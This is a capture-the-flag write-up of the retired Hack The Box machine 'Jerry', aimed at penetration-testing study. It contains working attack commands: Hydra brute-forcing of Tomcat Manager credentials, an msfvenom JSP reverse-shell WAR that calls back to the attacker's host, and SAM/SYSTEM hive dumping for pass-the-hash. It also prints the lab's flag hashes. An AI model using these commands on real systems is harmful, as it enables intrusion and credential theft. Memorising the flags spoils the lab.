> **Hack The Box | Windows | Easy**
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows Server 2012 R2 |
| **Difficulty** | Easy |
| **Category** | Windows / Tomcat / Default Credentials / WAR Deployment |
| **IP Address** | 10.129.136.9 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **Exploitation Method** | Manual: no Metasploit |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: port 8080 only |: |
| 2 | Gobuster directory brute-force: `/manager` discovered |: |
| 3 | Hydra HTTP-GET brute-force: `tomcat:s3cret` |: |
| 4 | msfvenom JSP reverse shell WAR |: |
| 5 | Tomcat Manager WAR upload + deploy → `/shell` | `NT AUTHORITY\SYSTEM` |
| 6 | Both flags in a single file | `NT AUTHORITY\SYSTEM` |

> Tomcat runs as `NT AUTHORITY\SYSTEM` on this machine: the initial shell is already the highest privilege level. No privilege escalation required.

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sC -sV -p- --min-rate 5000 -oA nmap/jerry 10.129.136.9
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.136.9
Host is up (0.11s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Nmap done: 1 IP address (1 host up) scanned in 38.47 seconds
```

**Key findings:**
- Single exposed port: `8080/tcp` only. No RDP, no SMB, no WinRM
- **Apache Tomcat 7.0.88**: version fingerprinted from the page title
- `Apache-Coyote/1.1`: JSP engine confirmed
- The entire attack surface is the Tomcat web application

Tomcat 7.0.88 is a legacy version (EOL). The primary attack path against any Tomcat instance is:
1. Find the Manager application
2. Authenticate (default credentials or brute-force)
3. Deploy a malicious WAR for RCE

### Web Enumeration: Gobuster

Browsing to `http://10.129.136.9:8080/` shows the default Tomcat landing page: confirming the service is up and unauthenticated access to the root is permitted.

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://10.129.136.9:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o gobuster.txt \
  -t 50
```

```
===============================================================
Gobuster v3.5
===============================================================
[+] Url:      http://10.129.136.9:8080
[+] Threads:  50
===============================================================
/docs                 (Status: 302)
/examples             (Status: 302)
/manager              (Status: 302) [→ http://10.129.136.9:8080/manager/html]
/host-manager         (Status: 302)
===============================================================
```

**`/manager`** redirects to `/manager/html`: the Tomcat Web Application Manager. Browsing to it triggers an HTTP Basic Authentication prompt.

This is the target. The Manager application allows authenticated users to deploy, undeploy, start, and stop web applications: including uploading arbitrary WAR files, which equates to arbitrary code execution on the server.

---

## Credential Discovery: Hydra HTTP-GET Brute-Force

The Manager application uses HTTP Basic Auth. The credential format is `username:password` encoded in Base64 in the `Authorization` header. Hydra's `-C` flag accepts a colon-separated credentials file and tests each pair against the endpoint.

### Wordlist Selection

SecLists provides a dedicated Tomcat default credentials list:

```bash
Hackerpatel007_1@htb[/htb]$ wc -l /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

```
79 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

```bash
Hackerpatel007_1@htb[/htb]$ head -5 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

```
admin:admin
admin:manager
admin:role1
admin:root
admin:tomcat
```

79 credential pairs specifically curated for Tomcat deployments: far more targeted than a generic password list.

### Hydra Brute-Force

```bash
Hackerpatel007_1@htb[/htb]$ HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra \
  -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  http-get://10.129.136.9:8080/manager/html
```

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries
[DATA] attacking http-get://10.129.136.9:8080/manager/html

[8080][http-get] host: 10.129.136.9   login: tomcat   password: s3cret

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished.
```

**Credentials: `tomcat:s3cret`**

> **Note on false positives:** Hydra may report multiple "valid" credentials for HTTP Basic Auth if the server returns a `200 OK` for an incorrect password (some Tomcat configs return the 403 page with a 200 status). Always manually verify each result: only `tomcat:s3cret` authenticates successfully and loads the Manager dashboard.

### Verify in Browser

Navigate to `http://10.129.136.9:8080/manager/html` and authenticate with `tomcat:s3cret`.

The Tomcat Web Application Manager loads: showing all deployed applications including `/`, `/docs`, `/examples`, `/host-manager`, and `/manager`. The **Deploy** section at the bottom accepts WAR file uploads.

---

## Exploitation: WAR Reverse Shell (No Metasploit)

### Step 1: Generate JSP Reverse Shell WAR

`msfvenom` generates the payload but the shell is caught manually with `nc`: this is not Metasploit exploitation:

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.16.236 \
  LPORT=4444 \
  -f war \
  -o shell.war
```

```
Payload size: 1103 bytes
Final size of war file: 1103 bytes
Saved as: shell.war
```

The payload type `java/jsp_shell_reverse_tcp` generates a JSP page inside a WAR archive. When Tomcat deploys the WAR and a request hits the JSP, the page executes: spawning a reverse TCP shell to the attack host. The connection is caught by netcat, not Metasploit's handler.

### Step 2: Start Netcat Listener

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 4444
```

```
Ncat: Version 7.94
Ncat: Listening on 0.0.0.0:4444
```

### Step 3: Upload and Deploy via Tomcat Manager

In the Manager UI, scroll to the **WAR file to deploy** section:

1. Click **Choose File** → select `shell.war`
2. Click **Deploy**

Tomcat extracts the WAR, registers the application, and it appears in the application list as `/shell` with status `Running: true`.

The deployment is confirmed in the Manager dashboard: `/shell` is now live.

### Step 4: Trigger the Shell

Click `/shell` in the application list, or navigate directly to:

```
http://10.129.136.9:8080/shell/
```

The JSP executes on the server and the reverse connection fires:

```
Ncat: Connection from 10.129.136.9.
Ncat: Connection from 10.129.136.9:49192.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

### Step 5: Confirm Privilege Level

```
C:\apache-tomcat-7.0.88> whoami
```

```
nt authority\system
```

`NT AUTHORITY\SYSTEM`: the highest privilege level on Windows. No privilege escalation required. Tomcat was configured to run as SYSTEM on this machine.

```
C:\apache-tomcat-7.0.88> systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version"
```

```
Host Name:                 JERRY
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
```

---

## Flag Collection

Jerry has a unique flag presentation: both `user.txt` and `root.txt` are stored together in a single file named **"2 for the price of 1.txt"** inside `C:\Users\Administrator\Desktop\flags\`.

```
C:\apache-tomcat-7.0.88> cd C:\Users\Administrator\Desktop\flags
C:\Users\Administrator\Desktop\flags> dir
```

```
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  2,412,539,904 bytes free
```

```
C:\Users\Administrator\Desktop\flags> type "2 for the price of 1.txt"
```

```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` | `7004dbcef0f854e0fb401875f26ebd00` |
| **root.txt** | `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` | `04a8b36e1545a455393d067e772fe90e` |

> Both flags are in the same file as a deliberate machine quirk: the file name "2 for the price of 1" reflects that landing on Tomcat as SYSTEM gives both flags simultaneously with no privilege escalation step.

---

## Post-Exploitation Notes

```
# Dump local password hashes for pass-the-hash opportunities
C:\> powershell -c "reg save HKLM\SAM C:\Temp\sam && reg save HKLM\SYSTEM C:\Temp\system"

# On Kali: extract hashes
Hackerpatel007_1@htb[/htb]$ secretsdump.py -sam sam -system system LOCAL
```

```
# Confirm Tomcat service account configuration
C:\> sc qc Tomcat7
```

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Tomcat7
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\apache-tomcat-7.0.88\bin\Tomcat7.exe" //RS//Tomcat7
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Apache Tomcat 7.0 Tomcat7
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

`SERVICE_START_NAME: LocalSystem` confirms the Tomcat service runs as `LocalSystem` (equivalent to SYSTEM): explaining why the WAR shell gives immediate SYSTEM access.

---

## Full Attack Chain Reference

```
[Recon] nmap -sC -sV -p- → port 8080 only, Apache Tomcat 7.0.88
    │
    ├─[Web] http://10.129.136.9:8080 → default Tomcat landing page
    │
    ├─[Gobuster] /manager → HTTP Basic Auth prompt
    │
    └─[Hydra] -C tomcat-betterdefaultpasslist.txt → tomcat:s3cret
            │
            └─[Tomcat Manager] authenticated → Deploy section visible
                    │
                    └─[msfvenom] java/jsp_shell_reverse_tcp → shell.war
                            │
                            ├─ Upload shell.war → Deploy
                            ├─ /shell appears in application list
                            └─ Click /shell → JSP executes → reverse shell fires
                                    │
                                    └─ nc -nvlp 4444 → NT AUTHORITY\SYSTEM
                                            │
                                            └─ C:\Users\Administrator\Desktop\flags\
                                                    └─ "2 for the price of 1.txt"
                                                            ├─ user.txt → 7004dbcef0f854e0fb401875f26ebd00
                                                            └─ root.txt → 04a8b36e1545a455393d067e772fe90e
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -p- --min-rate 5000 -oA nmap/jerry 10.129.136.9` | Full port scan with version detection |
| `gobuster dir -u http://10.129.136.9:8080 -w directory-list-2.3-medium.txt -t 50` | Directory brute-force |
| `HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C tomcat-betterdefaultpasslist.txt http-get://10.129.136.9:8080/manager/html` | HTTP Basic Auth brute-force |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.236 LPORT=4444 -f war -o shell.war` | Generate JSP reverse shell WAR |
| `nc -nvlp 4444` | Catch reverse shell |
| `whoami` | Confirm SYSTEM access |
| `systeminfo \| findstr /B /C:"OS Name"` | OS version fingerprint |
| `cd C:\Users\Administrator\Desktop\flags` | Navigate to flags directory |
| `dir` | List flags directory contents |
| `type "2 for the price of 1.txt"` | Read both flags from combined file |

---

## Lessons Learned

**1. Default credentials are the most reliable attack path against Tomcat.**
`tomcat:s3cret` is a classic default credential pair documented in every Tomcat credential list. In a real engagement, a Tomcat Manager exposed on the internet with default credentials is a P1 critical finding: it provides immediate OS-level code execution. Always run a dedicated default credential check before attempting anything else against Tomcat.

**2. The `-C` flag in Hydra with a colon-separated credentials file is the correct approach for HTTP Basic Auth.**
Using `-l`/`-P` for username and password separately doubles the attempt count unnecessarily when the credential pairs are known. The SecLists `tomcat-betterdefaultpasslist.txt` is curated specifically for this service: 79 targeted pairs is far more efficient than a generic wordlist attack.

**3. Hydra produces false positives on HTTP Basic Auth: always manually verify.**
Some web servers return `200 OK` even for failed authentication (displaying the 401 error page with a 200 status code). Hydra interprets any `200 OK` as success. After Hydra runs, test each reported credential pair manually in a browser before trusting the result.

**4. Tomcat Manager + WAR upload = OS code execution: no CVE required.**
This is a feature, not a vulnerability. The Manager application is designed to deploy web applications. Deploying a malicious WAR is not exploiting a bug: it is using the intended functionality with credentials that should never have been left as default. In pentesting reports, this is documented as **Tomcat Manager Exposed with Default Credentials** (CWE-1392), not as a CVE.

**5. `msfvenom` payload generation ≠ Metasploit exploitation.**
Using `msfvenom` to generate a payload and catching the shell with `nc` is entirely manual exploitation: the Metasploit framework is not involved in the attack chain. This approach is fully OSCP-compliant. The distinction matters: `msfvenom` is a standalone payload generator, not part of the Metasploit exploit handler.

**6. Service account privilege is the first thing to check after landing a shell.**
Running `whoami` immediately after getting the shell revealed `nt authority\system`. Understanding *why*: the Tomcat service was configured with `SERVICE_START_NAME: LocalSystem`: is the reportable finding. On real engagements, documenting `sc qc <service>` output to prove the misconfigured service account is mandatory for the remediation recommendation.

**7. Windows flag paths differ from Linux: know both structures.**
Jerry's flags are at `C:\Users\Administrator\Desktop\flags\`: the standard admin desktop path on Windows Server. The "2 for the price of 1" file name is a machine quirk (SYSTEM from initial foothold = both flags at once), but the path pattern `C:\Users\<user>\Desktop\` applies to most Windows HTB machines.

---

## References

- [Apache Tomcat 7 Security Considerations](https://tomcat.apache.org/tomcat-7.0-doc/security-howto.html)
- [SecLists: Tomcat Default Credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)
- [CWE-1392: Use of Default Credentials](https://cwe.mitre.org/data/definitions/1392.html)
- [Tomcat Manager WAR Deployment: Apache Docs](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)

---

*HTB Retired Machine: Jerry | Completed May 2026 | Flags included per HTB retired machine policy.*
